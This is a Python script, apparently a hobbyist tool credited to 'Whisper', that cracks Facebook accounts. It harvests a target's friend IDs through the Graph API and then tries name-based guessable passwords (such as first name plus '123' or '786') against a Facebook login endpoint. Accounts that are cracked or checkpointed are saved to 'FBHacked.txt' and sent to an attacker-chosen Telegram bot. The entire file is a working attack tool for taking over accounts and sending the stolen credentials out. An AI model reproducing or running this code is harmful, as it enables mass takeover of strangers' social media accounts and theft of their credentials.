#!/usr/bin/python2
# coding=utf-8
import os,mechanize,json,time,requests,sys,colorama,pyfiglet
idfromfriends = []
def logo():
 print(str(pyfiglet.figlet_format('FMB3'))+f"""Whisper </>
Facebook ==> @boy15.beats
InstaGram ==> @boyftn
GitHub ==> @whisper-666\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
 print(f"By {colorama.Fore.CYAN}TeleGram ==> @whisper666{colorama.Fore.RESET}")
def crack(done):
   os.system('clear')
   logo()
   ID=input('[+] Telegram ID ==> ')
   tok=input('[+] Telegram BOT Token ==> ')
   passw=input('[+] PassWord ==> ')
   br = mechanize.Browser()
   br.set_handle_robots(False)
   br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
   br.addheaders = [('User-Agent', 'Mozilla/5.0 (Linux; Android 5.1; PGN518) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.39 Mobile Safari/537.36')]
   idlist=done
   for line in open(idlist,'r').readlines():
    try:
     email=line.split(' =')[0]
     na=str(line.split('=> ')[1])
     nam=str(na.split('\n')[0])
     fn=nam.split(' ')[0]
     la=str(nam.split(' ')[1])
    except IndexError:
     pass
    except UnboundLocalError:
     pass
    password=passw
    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email='+email+'&locale=en_US&password='+password+'&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
    q = json.load(data)
    if 'access_token' in q:
      mra = f""".💕. WHISPER FB .📟.
 ︎.ꨄ︎ ––––––––––––––––︎ ꨄ︎.
 .😗. Name : {nam}
 .✉. ID : {email}
 .📟. PassWord : {password}
 .︎ꨄ︎ –––––––––––––––– ꨄ︎.
 .😈. Tele ==> @whisper666
        """
      with open('FBHacked.txt', 'a') as (HACKED):
         HACKED.write(f'{mra}')
      tlg =requests.post(f'https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text={mra}')
      print('\x1b[1;92m'+mra)
    elif 'www.facebook.com' in q['error_msg']:
      scu = f""".🎵. CheckPoint FB .📟.
 ︎.ꨄ︎ ––––––––––––––––︎ ꨄ︎.
 .😗. Name : {nam}
 .✉. ID : {email}
 .📟. PassWord : {password}
 .︎ꨄ︎ –––––––––––––––– ꨄ︎.
 .😈. Tele ==> @whisper666
"""
      print('\033[1;96m'+scu)
      tlg =requests.post(f'https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text={scu}')
      with open('CheckPoint.txt', 'a') as (Check):
         Check.write(f'{scu}')
    else:
      print('\033[1;91m[Wrong] \033[1;93m'+email+' ==> '+nam+' 》\033[1;94m '+password)
      pass2=fn+'123'
      data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email='+email+'&locale=en_US&password='+pass2+'&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
      q = json.load(data)
      if 'access_token' in q:
        mra = f""".💕. WHISPER FB .📟.
 ︎.ꨄ︎ ––––––––––––––––︎ ꨄ︎.
 .😗. Name : {nam}
 .✉. ID : {email}
 .📟. PassWord : {pass2}
 .︎ꨄ︎ –––––––––––––––– ꨄ︎.
 .😈. Tele ==> @whisper666
"""
        with open('FBHacked.txt', 'a') as (HACKED):
           HACKED.write(f'{mra}')
        tlg =requests.post(f'https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text={mra}')
        print('\x1b[1;92m'+mra)
      elif 'www.facebook.com' in q['error_msg']:
        scu = f""".🎵. CheckPoint FB .📟.
 ︎.ꨄ︎ ––––––––––––––––︎ ꨄ︎.
 .😗. Name : {nam}
 .✉. ID : {email}
 .📟. PassWord : {pass2}
 .︎ꨄ︎ –––––––––––––––– ꨄ︎.
 .😈. Tele ==> @whisper666
"""
        print('\033[1;96m'+scu)
        tlg =requests.post(f'https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text={scu}')
        with open('CheckPoint.txt', 'a') as (Check):
           Check.write(f'{scu}')
      else:
        print('\033[1;91m[Wrong] \033[1;93m'+email+' ==> '+nam+' 》\033[1;94m '+pass2)
        pass3=la+'123'
        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email='+email+'&locale=en_US&password='+pass3+'&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
        q = json.load(data)
        if 'access_token' in q:
          mra = f""".💕. WHISPER FB .📟.
 ︎.ꨄ︎ ––––––––––––––––︎ ꨄ︎.
 .😗. Name : {nam}
 .✉. ID : {email}
 .📟. PassWord : {pass3}
 .︎ꨄ︎ –––––––––––––––– ꨄ︎.
 .😈. Tele ==> @whisper666
"""
          with open('FBHacked.txt', 'a') as (HACKED):
             HACKED.write(f'{mra}')
          tlg =requests.post(f'https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text={mra}')
          print('\x1b[1;92m[HACKED]\033[1;93m '+email+' ==> '+nam+' 》\033[1;94m '+pass3)
        elif 'www.facebook.com' in q['error_msg']:
          scu = f""".🎵. CheckPoint FB .📟.
 ︎.ꨄ︎ ––––––––––––––––︎ ꨄ︎.
 .😗. Name : {nam}
 .✉. ID : {email}
 .📟. PassWord : {pass3}
 .︎ꨄ︎ –––––––––––––––– ꨄ︎.
 .😈. Tele ==> @whisper666
"""
          print('\033[1;96m'+scu)
          tlg =requests.post(f'https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text={scu}')
          with open('CheckPoint.txt', 'a') as (Check):
             Check.write(f'{scu}')
        else:
          print('\033[1;91m[Wrong] \033[1;93m'+email+' ==> '+nam+' 》\033[1;94m '+pass3)
          pass4=fn+'786'
          data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email='+email+'&locale=en_US&password='+pass4+'&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
          q = json.load(data)
          if 'access_token' in q:
            mra = f""".💕. WHISPER FB .📟.
 ︎.ꨄ︎ ––––––––––––––––︎ ꨄ︎.
 .😗. Name : {nam}
 .✉. ID : {email}
 .📟. PassWord : {pass4}
 .︎ꨄ︎ –––––––––––––––– ꨄ︎.
 .😈. Tele ==> @whisper666
"""
            with open('FBHacked.txt', 'a') as (HACKED):
               HACKED.write(f'{mra}')
            tlg =requests.post(f'https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text={mra}')
            print('\x1b[1;92m'+mra)
          elif 'www.facebook.com' in q['error_msg']:
            scu = f""".🎵. CheckPoint FB .📟.
 ︎.ꨄ︎ ––––––––––––––––︎ ꨄ︎.
 .😗. Name : {nam}
 .✉. ID : {email}
 .📟. PassWord : {pass4}
 .︎ꨄ︎ –––––––––––––––– ꨄ︎.
 .😈. Tele ==> @whisper666
"""
            print('\033[1;96m'+scu)
            tlg =requests.post(f'https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text={scu}')
            with open('CheckPoint.txt', 'a') as (Check):
               Check.write(f'{scu}')
          else:
            print('\033[1;91m[Wrong] \033[1;93m'+email+' ==> '+nam+' 》\033[1;94m '+pass4)
            pass5=la+'786'
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email='+email+'&locale=en_US&password='+pass5+'&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
              mra = f""".💕. WHISPER FB .📟.
 ︎.ꨄ︎ ––––––––––––––––︎ ꨄ︎.
 .😗. Name : {nam}
 .✉. ID : {email}
 .📟. PassWord : {pass5}
 .︎ꨄ︎ –––––––––––––––– ꨄ︎.
 .😈. Tele ==> @whisper666
"""
              with open('FBHacked.txt', 'a') as (HACKED):
                 HACKED.write(f'{mra}')
              tlg =requests.post(f'https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text={mra}')
              print('\x1b[1;92m'+mra)
            elif 'www.facebook.com' in q['error_msg']:
              scu = f""".🎵. CheckPoint FB .📟.
 ︎.ꨄ︎ ––––––––––––––––︎ ꨄ︎.
 .😗. Name : {nam}
 .✉. ID : {email}
 .📟. PassWord : {pass3}
 .︎ꨄ︎ –––––––––––––––– ꨄ︎.
 .😈. Tele ==> @whisper666
"""
              print('\033[1;96m'+scu)
              tlg =requests.post(f'https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text={scu}')
              with open('CheckPoint.txt', 'a') as (Check):
                 Check.write(f'{scu}')
            else:
              print('\033[1;91m[Wrong] \033[1;93m'+email+' ==> '+nam+' 》\033[1;94m '+pass5)
def whisper(fb_name,fb_token,id,bd):
	os.system('clear')
	logo()
	try:
#		fb_token=input('[+] FaceBook Token ==> ')
#	except KeyError:
#		print("\033[1;91m[!] Token Not Work")
#	except OSError:
#		pass
#	try:
		os.system('clear')
		logo()
		print(f"""FaceBook Name ==> {fb_name}
FaceBook ID ==> {id}
FaceBook BirthDay ==> {bd}
=====================================""")
		idt = input("\033[1;91m[+] \033[1;92mInput ID friend \033[1;91m: \033[1;97m")
		try:
			seat = requests.get("https://graph.facebook.com/"+idt+"?access_token="+fb_token)
			op = json.loads(seat.text)
			print("\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mFrom\033[1;91m :\033[1;97m "+op["name"])
		except KeyError:
			print("\033[1;91m[!] Friend not found")
			input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
			whisper(fb_name,fb_token,id,bd)
		r=requests.get("https://graph.facebook.com/"+idt+"?fields=friends.limit(50000)&access_token="+fb_token)
		z=json.loads(r.text)
		print('\033[1;91m[✺] \033[1;92mGet all friend id From '+op["name"]+'\033[1;97m...')
		print (42*"\033[1;97m═")
		make_action = open('id_whisper.txt','w')
		for a in z['friends']['data']:
			idfromfriends.append(a['id'])
			make_action.write(a['id'] +' ==> '+ a['name']+ '\n')
			print ("\r\033[1;97m[ \033[1;92m"+str(len(idfromfriends))+"\033[1;97m ]\033[1;97m=> \033[1;97m"+a['id']+' ==> '+a['name']),;sys.stdout.flush();time.sleep(0.0001)
		make_action.close()
		print('\r\033[1;91m[\033[1;96m✓\033[1;91m] \033[1;92mSuccessfully get id \033[1;97m....')
		print("\r\033[1;91m[+] \033[1;92mTotal ID \033[1;91m: \033[1;97m%s"%(len(idfromfriends)))
		done = input("\r\033[1;91m[+] \033[1;92mSave file with name\033[1;91m :\033[1;97m ")
		os.rename('id_whisper.txt',''+done)
		print("\r\033[1;91m[+] \033[1;92mFile saved \033[1;91m: \033[1;97m"+done)
		crack(done)
	except IOError:
		print("\033[1;91m[!] Error creating file")
		input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		whisper(fb_name,fb_token,id,bd)
	except (KeyboardInterrupt,EOFError):
		print("\033[1;91m[!] Stopped")
		input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		whisper(fb_name,fb_token,id,bd)
	except KeyError:
		print('\033[1;91m[!] Error')
		print(op)
		input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
		whisper(fb_name,fb_token,id,bd)
	except requests.exceptions.ConnectionError:
		print("\033[1;91m[✖] No connection")
		exit()
def fbwhisper():
	os.system('clear')
	logo()
	fb_token =input('[+] FaceBook Token ==> ')
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+fb_token)
		a = json.loads(otw.text)
		fb_name = a['name']
		id = a['id']
		bd = a['birthday']
		pick = open("login.txt", 'w')
		pick.write(fb_token)
		pick.close()
		whisper(fb_name,fb_token,id,bd)
	except KeyError:
	    fb_token=input("\033[1;91m[?] \033[1;92mToken\033[1;91m : \033[1;97m")
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+fb_token)
		a = json.loads(otw.text)
		fb_name = a['name']
		id = a['id']
		bd = a['birthday']
		pick = open("login.txt", 'w')
		pick.write(fb_token)
		pick.close()
		whisper(fb_name,id,bd)
	except KeyError:
		print("\033[1;91m[!] Token Not Work")
		time.sleep(3)
		fbwhisper()
os.system('clear')
logo()
w=input("""[1] From Public ID
[2] From ID List
[×] Choose ==> """)
if w =="1":
 fbwhisper()
elif w =="2":
 os.system('clear')
 logo()
 done=input('[+] ID List Name ==> ')
 crack(done)